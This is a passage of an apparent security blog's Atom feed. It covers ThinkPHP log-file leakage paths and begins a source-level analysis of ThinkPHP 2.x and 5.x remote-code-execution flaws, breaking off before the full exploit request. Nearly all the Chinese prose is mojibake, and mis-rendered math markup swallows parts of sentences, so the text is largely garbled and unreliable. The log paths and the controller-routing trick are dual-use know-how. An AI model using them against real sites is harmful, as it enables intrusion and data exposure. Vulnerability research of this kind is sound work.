è®°å½•ç³»ç»Ÿçš„æ•´ä½“è¿è¡ŒçŠ¶æ€</li></ul><p>â€‹TP3æœªå¼€å¯debugæƒ…å†µä¸‹è®°å½•çš„ä¿¡æ¯ï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911102033818.png" alt="image-20240911102033818" /></p><ul><li>Runtime\Logs\Home: è®°å½•æ¨¡å—è¿è¡Œçš„çŠ¶æ€</li></ul><p>â€‹TP3æœªå¼€å¯debugæƒ…å†µä¸‹è®°å½•çš„ä¿¡æ¯ï¼š</p><p>â€‹ä¼šè®°å½•ç³»ç»ŸæŠ¥é”™ä¿¡æ¯å’ŒSQLè¯­å¥ç›¸å…³</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911102141866.png" alt="image-20240911102141866" /></p><h2 id="2-æ—¥å¿—è·¯å¾„"><a class="markdownIt-Anchor" href="#2-æ—¥å¿—è·¯å¾„"></a> 2. æ—¥å¿—è·¯å¾„</h2><h3 id="tp3"><a class="markdownIt-Anchor" href="#tp3"></a> TP3</h3><p><strong>è·¯å¾„ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">Runtime&#x2F;Logs&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Runtime&#x2F;Logs&#x2F;Backend&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Ext&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Api&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Test&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Service&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ—¥å¿—åå­—ï¼š</strong></p><p>å¹´ä»½åä¸¤ä½_æœˆä»½_æ—¥æœŸ.log</p><p>24_01_23.log</p><h3 id="tp5"><a class="markdownIt-Anchor" href="#tp5"></a> TP5</h3><p><strong>è·¯å¾„ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>æ—¥å¿—åå­—ï¼Œå­˜åœ¨å¤šä¸ªåç¼€ï¼š</strong></p><p>å¹´ä»½æœˆä»½/æ—¥æœŸ.log</p><p>202409/10.log<br />202409/10_cli.log<br />202409/10_error.log<br />202409/10_sql.log</p><h3 id="tp6"><a class="markdownIt-Anchor" href="#tp6"></a> TP6</h3><p><strong>è·¯å¾„ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log&#x2F;runtime&#x2F;log&#x2F;Home&#x2F;runtime&#x2F;log&#x2F;Common&#x2F;runtime&#x2F;log&#x2F;Admin&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ—¥å¿—åå­—ï¼š</strong></p><p>å¹´ä»½æœˆä»½/æ—¥æœŸ.log</p><p>202409/10.log</p><h1 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h1><p><a href="https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22">https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22</a></p><p><a href="https://www.cnblogs.com/lktop/p/13802598.html">https://www.cnblogs.com/lktop/p/13802598.html</a></p><p><a href="https://xz.aliyun.com/t/9326">https://xz.aliyun.com/t/9326</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p><a href="https://furina.org.cn/2024/01/25/thinkphp-log-leakage/">https://furina.org.cn/2024/01/25/thinkphp-log-leakage/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-åº&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-åº&quot;&gt;&lt;/a&gt; 0x00 åº&lt;/h1&gt;
&lt;p&gt;ä¸Šé¢æˆ‘ä»¬åˆ†æäº†TPæ¡†æ¶å­˜åœ¨çš„é»˜è®¤æ¼æ´ï¼Œæ­¤ç¯‡åˆ†æä¸€ä¸‹éé»˜è®¤ç¯å¢ƒä¸‹çš„æ¼æ´ï¼Œå¯èƒ½ä¸»è¦åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æŸäº›å†…ç½®</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHPæ¡†æ¶é»˜è®¤RCEæ¼æ´åˆ†æ</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-08-16T02:34:00.295Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å¯"><a class="markdownIt-Anchor" href="#0x00-å¯"></a> 0x00 å¯</h1><p>é»‘ç›’debugå¼€å¯ä¼šæŠ¥é”™å‡ºå…·ä½“ç‰ˆæœ¬</p><p>ç™½ç›’çœ‹æœ¬åœ°tpä»£ç </p><p>tp3 åœ¨ç›®å½•çš„ThinkPHPæ–‡ä»¶ä¸­</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716150129242.png" alt="image-20240716150129242" /></p><p>TP5.0åœ¨ç›®å½•çš„base.phpæ–‡ä»¶ä¸­ : thinkphp/base.php</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716165942332.png" alt="image-20240716165942332" /></p><p>TP5.1: thinkphp/library/think/App.php</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725155723023.png" alt="image-20240725155723023" /></p><h1 id="0x01-thinkphp-2x-å‘½ä»¤æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#0x01-thinkphp-2x-å‘½ä»¤æ‰§è¡Œ"></a> 0x01 ThinkPHP 2.x å‘½ä»¤æ‰§è¡Œ</h1><p>PHP5çš„preg_replaceçš„/eæ¨¡å¼çš„å‘½ä»¤æ‰§è¡Œ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716155011163.png" alt="image-20240716155011163" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æ­£åˆ™è§„åˆ™'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'æ›¿æ¢å­—ç¬¦'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ç›®æ ‡å­—ç¬¦'</span><span class="token punctuation">)</span>    æ­£åˆ™è§„åˆ™ä½¿ç”¨eä¿®é¥°æ—¶ï¼Œå¦‚æœä»ç›®æ ‡å­—ç¬¦åŒ¹é…åˆ°æ­£åˆ™è§„åˆ™ï¼Œé‚£ä¹ˆæ›¿æ¢å­—ç¬¦çš„phpè¯­å¥å°±ä¼šæ‰§è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ä¸ªåˆ†æè¿‡ç¨‹å‚è€ƒè¿™ç¯‡æ–‡ç« å³å¯ï¼Œå®æˆ˜å‡ ä¹æ²¡é‡è§è¿‡TP2ï¼Œä»¥åæœ‰ç©ºå†åˆ†æå§ï¼š<a href="https://www.freebuf.com/articles/people/223149.html">https://www.freebuf.com/articles/people/223149.html</a></p><h1 id="0x02-thinkphp-5x-å‘½ä»¤æ‰§è¡Œå…¼å®¹æ¨¡å¼æ”¯æŒå®ä¾‹åŒ–ä»»æ„æ§åˆ¶å™¨å¯¼è‡´rce"><a class="markdownIt-Anchor" href="#0x02-thinkphp-5x-å‘½ä»¤æ‰§è¡Œå…¼å®¹æ¨¡å¼æ”¯æŒå®ä¾‹åŒ–ä»»æ„æ§åˆ¶å™¨å¯¼è‡´rce"></a> 0x02 ThinkPHP 5.x å‘½ä»¤æ‰§è¡Œï¼ˆå…¼å®¹æ¨¡å¼æ”¯æŒå®ä¾‹åŒ–ä»»æ„æ§åˆ¶å™¨å¯¼è‡´RCEï¼‰</h1><h2 id="1å½±å“ç‰ˆæœ¬"><a class="markdownIt-Anchor" href="#1å½±å“ç‰ˆæœ¬"></a> 1.å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.22</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.30</p><p>patchæ–¹å¼ï¼š</p><p>æ·»åŠ æ­£åˆ™åˆ¤æ–­controllerå</p><p><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p>5.0<img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240716162407625.png" alt="image-20240716162407625" /></p><p><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p>5.1</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725151852349.png" alt="image-20240725151852349" /></p><h2 id="2æ¼æ´åˆ†æ"><a class="markdownIt-Anchor" href="#2æ¼æ´åˆ†æ"></a> 2.æ¼æ´åˆ†æ</h2><p>æœ¬åœ°è°ƒè¯•ç¯å¢ƒç‰ˆæœ¬ä¸º5.0.22</p><p>è¡¥ä¸åˆ¤æ–­äº†æ§åˆ¶å™¨åªå…è®¸æœ‰å­—æ¯æ•°å­—</p><p>å…ˆè·Ÿä¸€ä¸‹5.0.22çš„$controlleréƒ½åšäº†ä»€ä¹ˆ</p><p>è®¿é—®index.php</p><ul><li>å› ä¸ºæ²¡æœ‰ä¼ å…¥æ§åˆ¶å™¨ï¼Œé»˜è®¤çš„æ§åˆ¶å™¨æ˜¯Index</li><li>é»˜è®¤é…ç½®$convertä¸ºtrueï¼Œä¼šå°†æ§åˆ¶å™¨åå°å†™å¤„ç†</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723173927452.png" alt="image-20240723173927452" /></p><p><strong>åˆ†ææµç¨‹ï¼š</strong></p><ol><li>è¿›å…¥ä¸‹æ–¹çš„parseNameé™æ€æ–¹æ³•</li></ol><ul><li>åšçš„æ˜¯åç§°é£æ ¼è½¬æ¢ï¼Œå°±æ˜¯é©¼å³°ã€é¦–å­—æ¯å¤§å†™å’Œè›‡å½¢çš„ç¼–ç åç§°çš„è½¬æ¢ï¼Œä¸æ˜¯æ ¸å¿ƒé—®é¢˜</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174505492.png" alt="image-20240723174147581" /></p><ol start="2"><li>è¿›å…¥ä¸‹æ–¹çš„æ“ä½œ$controllerå˜é‡çš„ä½ç½®ï¼Œè·Ÿå…¥Loaderçš„controlleré™æ€æ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724175539279.png" alt="image-20240724175539279" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174521168.png" alt="image-20240723174521168" /></p><ol start="3"><li>çœ‹æ³¨é‡Šå‘ç°æ˜¯å®ä¾‹åŒ–æ§åˆ¶å™¨çš„ï¼Œä¼ å…¥çš„å½¢å‚ä¸º$nameï¼Œè·Ÿå…¥ä¸‹æ–¹çš„getModuleAndClassé™æ€æ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723174847375.png" alt="image-20240723174847375" /></p><ol start="4"><li>ä¸¤ä¸ªifï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­ä¼ å…¥çš„æ§åˆ¶å™¨åå­—æ˜¯å¦åŒ…å«â€™\â€˜å­—ç¬¦ï¼Œä¸åŒ…å«çš„è¯ä¼šèµ°ä¸‹é¢çš„elseï¼Œä¸‹é¢ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨â€™/â€˜å­—ç¬¦ï¼Œå­˜åœ¨ä¼šæŒ‰ç…§â€™/'å­—ç¬¦åˆ†å‰²è¿”å›ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723175203807.png" alt="image-20240723175203807" /></p><ol start="5"><li>è·Ÿå…¥ä¸‹æ–¹èµ‹å€¼<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">çš„</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi mathvariant="normal">æ–¹</mi><mi mathvariant="normal">æ³•</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">å‚</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">ä¸º</mi><mi mathvariant="normal">æˆ‘</mi><mi mathvariant="normal">ä»¬</mi><mi mathvariant="normal">ä¸Š</mi><mi mathvariant="normal">é¢</mi><mi mathvariant="normal">å–</mi><mi mathvariant="normal">å¾—</mi><mi mathvariant="normal">çš„</mi></mrow><annotation encoding="application/x-tex">classçš„parseClassæ–¹æ³•ï¼Œå‚æ•°ä¸ºæˆ‘ä»¬ä¸Šé¢å–å¾—çš„</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">çš„</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">æ–¹</span><span class="mord cjk_fallback">æ³•</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">ä¸Š</span><span class="mord cjk_fallback">é¢</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">çš„</span></span></span></span>moduleå’Œ$nameï¼ˆæ§åˆ¶å™¨åç§°ï¼‰</li></ol><p>å…³æ³¨ä¸‹ä¸‹é¢åšäº†ä»€ä¹ˆ</p><ul><li>æ›¿æ¢nameä¸­çš„/å’Œ. å†æŒ‰ç…§å­—ç¬¦åˆ’åˆ†ä¸ºæ•°ç»„</li><li>parseNameæˆ‘ä»¬ä¸Šé¢åˆ†æè¿‡ï¼Œæ˜¯åšåç§°è½¬æ¢çš„ï¼ˆé©¼å³°ã€é¦–å­—æ¯å¤§å†™å’Œè›‡å½¢ï¼‰ï¼Œè¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ </li><li>æ ¹æ®é…ç½®ï¼Œçœ‹åç¼€æ˜¯å¦é…ç½®ï¼Œå°†åç¼€æ‹¼æ¥åˆ°$classåå­—ä¸­</li><li>å°†å»æ‰æœ€åå…ƒç´ çš„åŸå§‹æ•°ç»„æ‹¼æ¥å›å­—ç¬¦</li></ul><p>è¿”å›å€¼ï¼šè¿”å›å‘½åç©ºé—´+æ¨¡å—+å±‚å+ç±»å+ç±»ååç¼€</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723181604729.png" alt="image-20240723181604729" /></p><p>æœ€ç»ˆè¿”å›æ•°ç»„</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182451423.png" alt="image-20240723182451423" /></p><ol start="6"><li>å›åˆ°ä¸Šé¢çš„loaderçš„é™æ€æ–¹æ³•controllerä¸­ï¼Œè·å–è¿”å›å€¼åï¼Œä¼šè°ƒç”¨invokeClassæ–¹æ³•ï¼Œè¿™ä¸ªçœ‹èµ·æ¥å°±æ˜¯å®ä¾‹åŒ–ç±»çš„æ–¹æ³•ï¼Œ è·Ÿå…¥</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182537533.png" alt="image-20240723182537533" /></p><p>æœç„¶æ˜¯åå°„å®ä¾‹åŒ–ç±»</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182700386.png" alt="image-20240723182700386" /></p><ol start="7"><li>å®ä¾‹åŒ–åï¼Œå‘ç°è¿˜ä¼šè·å–å½“å‰çš„actionå‚æ•°ï¼Œå¹¶è°ƒç”¨å®ä¾‹åŒ–ç±»çš„å¯¹åº”æ–¹æ³•</li></ol><p>è¿™é‡Œçš„actionä¸ä¸Šé¢çš„controllerè·å–æ–¹å¼ç±»ä¼¼</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182955473.png" alt="image-20240723182955473" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240723182833361.png" alt="image-20240723182833361" /></p><p>æ•´ä¸ªåŠŸèƒ½å°±è·Ÿå®Œäº†ï¼Œæˆ‘ä»¬å‘ç°æœ€åæ˜¯å®ä¾‹åŒ–å‘½åç©ºé—´ç±»ï¼Œå¹¶è°ƒç”¨äº†å¯¹åº”çš„æ–¹æ³•ï¼Œç›²çŒœä¸€ä¸‹è¿™æ˜¯ä¸€ä¸ªå¯ä»¥å®ä¾‹åŒ–ä»»æ„æ–¹æ³•çš„æ¼æ´ï¼Œ æˆ‘ä»¬è·Ÿä¸€ä¸‹ä¼ å…¥çš„å‚æ•°æ˜¯ä¸æ˜¯å¯æ§ï¼Œè¿”å›å‘½åç©ºé—´å’Œæ–¹æ³•çš„å‚æ•°æ˜¯å¦å¯ä»¥è°ƒç”¨åˆ°æˆ‘ä»¬æƒ³å®ç°çš„æ–¹æ³•ã€‚</p><p>ä¼ å…¥çš„<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">å‚</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">ä¸º</mi><mi mathvariant="normal">æ¨¡</mi><mi mathvariant="normal">å—</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">æ§</mi><mi mathvariant="normal">åˆ¶</mi><mi mathvariant="normal">å™¨</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">æ“</mi><mi mathvariant="normal">ä½œ</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">ä¼ </mi><mi mathvariant="normal">å…¥</mi><mi mathvariant="normal">å€¼</mi><mi mathvariant="normal">å¯</mi><mi mathvariant="normal">æ§</mi><mi mathvariant="normal">ã€‚</mi><mi mathvariant="normal">ç”±</mi><mi mathvariant="normal">ä¸Š</mi><mi mathvariant="normal">å›¾</mi><mi mathvariant="normal">å¯</mi><mi mathvariant="normal">çŸ¥</mi><mi mathvariant="normal">ï¼Œ</mi></mrow><annotation encoding="application/x-tex">resultå‚æ•°ä¸ºæ¨¡å—/æ§åˆ¶å™¨/æ“ä½œï¼Œä¼ å…¥å€¼å¯æ§ã€‚ç”±ä¸Šå›¾å¯çŸ¥ï¼Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">å‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">æ¨¡</span><span class="mord cjk_fallback">å—</span><span class="mord">/</span><span class="mord cjk_fallback">æ§</span><span class="mord cjk_fallback">åˆ¶</span><span class="mord cjk_fallback">å™¨</span><span class="mord">/</span><span class="mord cjk_fallback">æ“</span><span class="mord cjk_fallback">ä½œ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¼ </span><span class="mord cjk_fallback">å…¥</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">æ§</span><span class="mord cjk_fallback">ã€‚</span><span class="mord cjk_fallback">ç”±</span><span class="mord cjk_fallback">ä¸Š</span><span class="mord cjk_fallback">å›¾</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">ï¼Œ</span></span></span></span>actionä¸ºä¼ å…¥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mi mathvariant="normal">åˆ‡</mi><mi mathvariant="normal">å‰²</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">ç»„</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">ç¬¬</mi><mi mathvariant="normal">ä¸‰</mi><mi mathvariant="normal">ä¸ª</mi><mi mathvariant="normal">å…ƒ</mi><mi mathvariant="normal">ç´ </mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">ç±»</mi><mi mathvariant="normal">å</mi><mi mathvariant="normal">ä¸º</mi></mrow><annotation encoding="application/x-tex">resultåˆ‡å‰²æ•°ç»„çš„ç¬¬ä¸‰ä¸ªå…ƒç´ ï¼Œç±»åä¸º</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">åˆ‡</span><span class="mord cjk_fallback">å‰²</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ç»„</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ç¬¬</span><span class="mord cjk_fallback">ä¸‰</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">å…ƒ</span><span class="mord cjk_fallback">ç´ </span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ç±»</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ä¸º</span></span></span></span>instanceå‚æ•°ï¼Œè·Ÿä¸€ä¸‹è¿™ä¸ªå€¼çš„äº§ç”Ÿå³å¯ï¼Œ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724174443495.png" alt="image-20240724174443495" /></p><p><strong>åˆ©ç”¨æµç¨‹ï¼š</strong></p><ol><li>çœ‹å›åˆ†ææµç¨‹çš„ç¬¬2æ­¥ï¼Œ<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">å˜</mi><mi mathvariant="normal">é‡</mi><mi mathvariant="normal">æ˜¯</mi></mrow><annotation encoding="application/x-tex">controllerå˜é‡æ˜¯</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">å˜</span><span class="mord cjk_fallback">é‡</span><span class="mord cjk_fallback">æ˜¯</span></span></span></span>resultåˆ‡å‰²æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œè·Ÿå…¥ç¬¬3æ­¥æ–¹æ³•ï¼Œè¿”å›å€¼å–å†³äºè¿™ä¸ª$classå€¼</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724175721587.png" alt="image-20240724175721587" /></p><ol start="2"><li>é‡ç‚¹åœ¨getModuleAndClassé™æ€æ–¹æ³•ï¼Œå…³æ³¨è¿”å›çš„$classã€‚</li></ol><p>çœ‹å›åˆ†ææµç¨‹çš„ç¬¬4æ­¥ï¼Œ$classçš„èµ‹å€¼åªæœ‰ä¸¤å¤„ï¼š</p><ul><li>ç¬¬ä¸€å¤„é€»è¾‘æ˜¯å¦‚æœnameä¸­åŒ…å«\ï¼Œç›´æ¥è¿”å›nameåšclass</li><li>ç¬¬äºŒå¤„çš„é€»è¾‘æˆ‘ä»¬åœ¨ç¬¬5æ­¥åˆ†æäº†ï¼Œè¿”å›å€¼æ˜¯æ‹¼æ¥çš„ï¼Œä¸”å¼€å¤´çš„å‘½åç©ºé—´ä¸ºApp::$namespaceï¼Œé™åˆ¶è¾ƒé«˜</li></ul><p>è¿™æ ·æ¥çœ‹æˆ‘ä»¬è¦è®©ä¼ å…¥çš„nameå‚æ•°åŒ…å«\ï¼Œnameå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹è·å–çš„$controlleræ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724180055811.png" alt="image-20240724180055811" /></p><p>åˆ†æåå°±å¾ˆç®€å•äº†</p><p>æˆ‘ä»¬ä¼ å…¥çš„æ ¼å¼æ˜¯ï¼šæ¨¡å—/æ§åˆ¶å™¨/æ“ä½œï¼Œæ§åˆ¶å™¨è¿™é‡Œæˆ‘ä»¬è¦ä¼ å…¥å­—ç¬¦åŒ…å«\ï¼Œè¿™æ ·æœ€ç»ˆå¤„ç†åå°±èƒ½ç›´æ¥åˆå§‹åŒ–æˆ‘ä»¬æƒ³è¦çš„classã€‚è€Œ\åœ¨tpæœ‰é¢å¤–çš„â€å‘½åç©ºé—´çš„å«ä¹‰â€œï¼Œè¿™æ ·ä¹Ÿå°±è¾¾æˆäº†å¯ä»¥åˆå§‹åŒ–ä»»æ„ç±»çš„ç›®çš„</p><p>æˆ‘ä»¬å…ˆæµ‹è¯•ä¼ å…¥index/a\b/1</p><p>å‘ç°æ— æ³•è§£æ\ï¼ŒæœåŠ¡ç«¯å½“ä½œäº†/å¤„ç†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181057139.png" alt="image-20240724181057139" /></p><p>ä½†æ˜¯tpé»˜è®¤æ”¯æŒå¤šç§è·¯ç”±æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°çš„å½¢å¼ä¼ å…¥</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181538375.png" alt="image-20240724181538375" /></p><p>æ¥ä¸‹æ¥æ”¹ä¸€ä¸‹ä¼ å‚æ–¹å¼ï¼š<a 